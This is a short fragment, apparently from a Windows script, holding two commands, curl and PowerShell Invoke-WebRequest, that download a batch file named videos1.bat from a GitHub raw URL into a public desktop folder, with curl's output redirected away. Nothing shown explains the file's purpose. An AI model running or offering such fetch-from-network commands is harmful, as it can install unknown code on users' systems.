...
curl -o "C:\Users\Public\Desktop\videos1.bat" https://raw.githubusercontent.com/hemo121/r3/main/videos1.bat > out.txt 2>&1
...
powershell -Command "& {Invoke-WebRequest https://raw.githubusercontent.com/hemo121/r3/main/videos1.bat -OutFile videos1.bat}"
